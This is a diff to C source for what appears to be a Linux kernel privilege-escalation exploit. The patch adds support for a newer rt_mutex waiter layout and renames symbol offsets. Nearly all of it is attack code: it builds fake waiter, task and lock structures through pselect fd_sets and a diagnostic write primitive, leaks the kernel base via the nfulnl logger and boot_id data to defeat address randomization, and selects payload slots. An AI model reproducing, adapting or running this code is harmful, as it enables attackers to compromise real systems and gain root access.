@@ -158,7 +158,7 @@ void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
     uint64_t value;
     const char *name;
   } words[] = {
-#if LEGACY_RT_MUTEX_WAITER
+#if LEGACY_RT_MUTEX_WAITER || COMPACT_RT_MUTEX_WAITER
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
     {0, slide_oracle_parent, "tree_pc"},
     {1, 0, "tree_right"},
@@ -167,12 +167,12 @@ void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
     {4, 0, "pi_right"},
     {5, slide_oracle_target, "pi_left"},
 #else
-    {0, SLIDE_LOGGERS_0_1 + slide_p0_offset, "tree_pc"},
+    {0, SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset, "tree_pc"},
     {1, 0, "tree_right"},
     {2, SLIDE_WAITER_TREE_LEFT + slide_p0_offset, "tree_left"},
-    {3, SLIDE_LOGGERS_0_1 + slide_p0_offset, "pi_pc"},
+    {3, SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset, "pi_pc"},
     {4, 0, "pi_right"},
-    {5, SLIDE_RANDOM_BOOT_ID_DATA + slide_p0_offset, "pi_left"},
+    {5, SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR + slide_p0_offset, "pi_left"},
 #endif
 #if defined(SLIDE_USE_FAKE_TASK) && SLIDE_USE_FAKE_TASK
     {6, fake_task, "task"},
@@ -180,8 +180,17 @@ void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
     {6, SLIDE_WAITER_TASK + slide_p0_offset, "task"},
 #endif
     {7, fake_lock, "lock"},
+#if COMPACT_RT_MUTEX_WAITER
+    {8, ((uint64_t)(uint32_t)FAKE_WAITER_PRIO << 32) |
+            (uint32_t)SLIDE_WAITER_WAKE_STATE,
+     "wake_state+prio"},
+#else
     {8, FAKE_WAITER_PRIO, "prio"},
+#endif
     {9, 0, "deadline"},
+#if COMPACT_RT_MUTEX_WAITER
+    {10, 0, "ww_ctx"},
+#endif
 #else
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
     {0, slide_oracle_parent, "tree_pc"},
@@ -192,13 +201,13 @@ void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
     {6, 0, "pi1"},
     {7, slide_oracle_target, "pi2"},
 #else
-    {0, SLIDE_LOGGERS_0_1 + slide_p0_offset, "tree_pc"},
+    {0, SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset, "tree_pc"},
     {1, 0, "tree_right"},
     {2, SLIDE_WAITER_TREE_LEFT + slide_p0_offset, "tree_left"},
     {3, FAKE_WAITER_PRIO, "tree_prio"},
-    {5, SLIDE_LOGGERS_0_1 + slide_p0_offset, "pi0"},
+    {5, SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset, "pi0"},
     {6, 0, "pi1"},
-    {7, SLIDE_RANDOM_BOOT_ID_DATA + slide_p0_offset, "pi2"},
+    {7, SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR + slide_p0_offset, "pi2"},
 #endif
     {8, FAKE_WAITER_PRIO, "pi_prio"},
     {9, 0, "pi_deadline"},
@@ -517,7 +526,7 @@ uint64_t slide_read_stext(void) {
     return 0;
   }
 
-  uint64_t off = p0_alias_image_offset(SLIDE_NFULNL_LOGGER);
+  uint64_t off = p0_alias_image_offset(SLIDE_NFULNL_LOGGER_NAME);
   uint64_t stext = leaked - off;
   pr_success("slide boot_id_leaked_nfulnl_logger pid=%d value=%016llx stext=%016llx\n",
              getpid(), (unsigned long long)leaked, (unsigned long long)stext);
@@ -762,7 +771,7 @@ static int prepare_p0_diag_waiter(int fd, uintptr_t waiter,
       !p0_diag_write64(fd, waiter + 0x10, 0)) {
     return 0;
   }
-#if LEGACY_RT_MUTEX_WAITER
+#if LEGACY_RT_MUTEX_WAITER || COMPACT_RT_MUTEX_WAITER
   return p0_diag_write64(fd, waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00,
                          parent) &&
          p0_diag_write64(fd, waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08,
@@ -771,9 +780,16 @@ static int prepare_p0_diag_waiter(int fd, uintptr_t waiter,
                          target) &&
          p0_diag_write64(fd, waiter + FAKE_WAITER_TASK_OFF, task) &&
          p0_diag_write64(fd, waiter + FAKE_WAITER_LOCK_OFF, lock) &&
+#if COMPACT_RT_MUTEX_WAITER
+         p0_diag_write32(fd, waiter + FAKE_WAITER_WAKE_STATE_OFF, 0) &&
+#endif
          p0_diag_write32(fd, waiter + FAKE_WAITER_PRIO_OFF,
                          SLIDE_FAKE_WAITER_PRIO) &&
-         p0_diag_write64(fd, waiter + FAKE_WAITER_DEADLINE_OFF, 0);
+         p0_diag_write64(fd, waiter + FAKE_WAITER_DEADLINE_OFF, 0)
+#if COMPACT_RT_MUTEX_WAITER
+         && p0_diag_write64(fd, waiter + FAKE_WAITER_WW_CTX_OFF, 0)
+#endif
+         ;
 #else
   return p0_diag_write32(fd, waiter + FAKE_WAITER_TREE_PRIO_OFF,
                          SLIDE_FAKE_WAITER_PRIO) &&
@@ -988,8 +1004,9 @@ int slide_leak_kernel_base(void) {
     pr_info("slide attempt %d/%d p0_offset=%08zx logger_parent=%016llx "
             "bootid_target=%016llx\n",
             attempt, max_attempts, slide_p0_offset,
-            (unsigned long long)(SLIDE_LOGGERS_0_1 + slide_p0_offset),
-            (unsigned long long)(SLIDE_RANDOM_BOOT_ID_DATA + slide_p0_offset));
+            (unsigned long long)(SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset),
+            (unsigned long long)(
+                SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR + slide_p0_offset));
 #if defined(APP_PAYLOAD) && APP_PAYLOAD && \
     defined(SLIDE_P0_OFFSET_CANDIDATES)
     if (!select_slide_payload_slot(slide_p0_offset)) {
